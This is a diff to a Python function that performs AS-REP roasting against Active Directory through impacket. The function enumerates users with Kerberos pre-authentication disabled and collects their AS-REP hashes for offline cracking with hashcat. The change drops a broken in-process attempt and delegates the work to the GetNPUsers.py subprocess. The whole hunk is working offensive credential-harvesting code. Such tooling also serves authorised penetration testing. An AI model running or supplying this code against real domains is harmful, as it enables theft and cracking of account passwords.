@@ -308,81 +308,11 @@ def asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[str]:
 
     domain_upper = domain.upper()
 
-    for username in users:
-        try:
-            # Build the client principal (username only, no realm component here)
-            client_name = Principal(
-                username,
-                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
-            )
-            # Request AS-REQ without pre-authentication
-            # getKerberosTGT raises KerberosError if pre-auth is required
-            tgt, cipher, old_session_key, session_key = getKerberosTGT(
-                clientName=client_name,
-                password="",           # no password — will trigger pre-auth error
-                domain=domain_upper,
-                lmhash=b"",
-                nthash=b"",
-                aesKey="",
-                kdcHost=dc_ip,
-                requestPAC=False,
-            )
-            # If we get here the user has pre-auth DISABLED — we have a TGT
-            # but we cannot format it as an AS-REP hash from getKerberosTGT's
-            # return value alone; signal success differently.
-            _log(f"    [!] {username}: pre-auth NOT required — TGT obtained (hash unavailable via this API path)")
-
-        except Exception as exc:
-            exc_str = str(exc)
-            # KDC_ERR_PREAUTH_REQUIRED  (25) means normal — user has pre-auth
-            if "KDC_ERR_PREAUTH_REQUIRED" in exc_str or "25" in exc_str:
-                continue
-            # KDC_ERR_C_PRINCIPAL_UNKNOWN (6) — user does not exist
-            if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in exc_str or "6" in exc_str:
-                continue
-            # eRR_CLIENT_REVOKED (18) — account disabled/locked
-            if "KDC_ERR_CLIENT_REVOKED" in exc_str or "18" in exc_str:
-                _log(f"    {username}: account disabled/locked — skipping")
-                continue
-            # Any other error — log but continue
-            _log(f"    {username}: unexpected Kerberos error: {exc_str[:120]}")
-            continue
-
-    # -----------------------------------------------------------------------
-    # Fallback: raw AS-REP hash extraction via impacket's internal ASN.1 path
-    # The public getKerberosTGT API does not directly expose the AS-REP PDU
-    # for hash formatting.  Use the lower-level approach that GetNPUsers.py
-    # uses internally (impacket.krb5.kerberosv5.getKerberosTGT with
-    # requestNoPAC flag is sufficient for session acquisition, but the
-    # formatted hash requires parsing the raw AS-REP).  We replicate the
-    # approach here using impacket's ASN.1 objects.
-    # -----------------------------------------------------------------------
-    try:
-        from impacket.krb5.kerberosv5 import sendReceive
-        from impacket.krb5.asn1 import AS_REQ as ASN1_AS_REQ, AS_REP as ASN1_AS_REP
-        from pyasn1.codec.ber import decoder, encoder
-        from impacket.krb5 import constants as krb5constants
-
-        kdc_ip   = dc_ip
-        kdc_port = 88
-
-        for username in users:
-            try:
-                # Build a minimal AS-REQ without PA-ENC-TIMESTAMP
-                client_name = Principal(
-                    username,
-                    type=krb5constants.PrincipalNameType.NT_PRINCIPAL.value,
-                )
-                # impacket helper: build raw AS-REQ bytes
-                from impacket.krb5.kerberosv5 import AS_REQ as build_AS_REQ_func
-                # Actually use the internal builder
-                tgt_req = build_AS_REQ_func()  # type may vary by version
-
-            except Exception:
-                break  # impacket API differs from expected — give up this path
-
-    except ImportError:
-        pass  # pyasn1 or other dep missing — skip
+    # The getKerberosTGT API returns a TGT but does not expose the raw
+    # AS-REP PDU needed to format a hashcat hash.  Delegate directly to
+    # the subprocess fallback (GetNPUsers.py) which handles this correctly.
+    _log("  Python API path cannot extract AS-REP hashes; deferring to GetNPUsers.py subprocess")
+    hashes = asrep_roast_subprocess(dc_ip, domain, users)
 
     _log(f"  AS-REP roast complete: {len(hashes)} hashes recovered")
     return hashes
